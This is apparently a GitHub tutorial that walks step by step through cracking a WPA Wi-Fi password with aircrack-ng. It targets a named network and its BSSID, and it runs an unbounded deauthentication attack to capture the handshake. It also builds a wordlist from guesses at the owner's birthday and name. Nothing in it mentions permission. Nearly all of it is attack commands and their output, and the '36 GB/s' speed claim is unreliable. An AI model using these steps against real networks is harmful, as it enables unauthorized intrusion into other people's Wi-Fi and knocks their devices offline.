# Example crack wpa attack with aircrack-ng

i use tp-link wn725n (chipset rtl8188eus) and parrotOS, the name of it is ridiculous

connect your card wifi and check

```
iwconfig
```

![image](https://user-images.githubusercontent.com/90561566/166419875-330952f9-ce4a-416d-b403-ec2d39ecc3dc.png)

```
airmon-ng start <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166419967-2d8d1bd2-eb49-40b7-b46f-cf52497eba4b.png)

```
airodump-ng <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420371-20c0ce94-e653-4cda-b87b-72f071d94a49.png)

i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19`

```
airodump-ng -c <CH> --bssid <bssid> -w out <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420867-1c3d3d5a-5c26-4f67-b271-84f9a19c81d0.png)

new terminal

```
aireplay-ng --deauth 0 -a <bssid> <iface>
```

wait about 5s, return airodump-ng terminal, if you see WPA handshake is okay and Ctrl+C to stop (both)

![image](https://user-images.githubusercontent.com/90561566/166421288-8ba74de3-f6f9-4973-be3e-d9aafd8fcb11.png)

```
ls
```

![image](https://user-images.githubusercontent.com/90561566/166421374-cfcf7080-c28a-402b-a6cb-9fda3a275a91.png)

create passlist

```
crunch <min> <max> <charset> -t <pattern> -o password.txt
```

because it's going to be a very, very large file, so i'm going to reveal that

the password is 8 numbers (i think it contains in his birthday) and 1 character (i think it contains in his name)

you can also use [Cupp](https://github.com/lucthienphong1120/cupp) to make such inferences

![image](https://user-images.githubusercontent.com/90561566/166604507-5c291bf0-6961-4a15-8c52-cf5faf0b749f.png)

the output file about 11,5 GB and 1,2 billion passwords

---

now you can crack wpa with

```
aircrack-ng -w password.txt out*.cap
```

![image](https://user-images.githubusercontent.com/90561566/166444763-a0cb15e0-309f-430e-bc6d-ce92e7863f0e.png)

---

but i will use database to speed up the attack

it will take more time to set up the database (but it will be much faster than regular crack)

you should only use it if you create a permanent database for crack because it will take a long time (or the passlist is not too long)

install sqlite3 `sudo apt install sqlite3`

create a file `essid.txt` this write name of target wifi

![image](https://user-images.githubusercontent.com/90561566/166434891-81c08ca3-48ff-4579-9a74-fe6e65634b42.png)

```
airolib-ng crackwpa --import passwd password.txt
airolib-ng crackwpa --import essid essid.txt
```

![image](https://user-images.githubusercontent.com/90561566/166435872-44a73959-3784-41c3-849a-5c1aa823dcd4.png)

```
airolib-ng crackwpa --batch
```

![image](https://user-images.githubusercontent.com/90561566/166454564-9b6cd253-74a0-4304-b94e-988a3e92f825.png)


now crack with database, you will be surprised

```
aircrack-ng -r crackwpa out*.cap
```

done! there is the password (crack speed is about 36 GB/s)

![image](https://user-images.githubusercontent.com/90561566/166684325-e337e6cd-f376-4172-91a2-617a80a3156c.png)











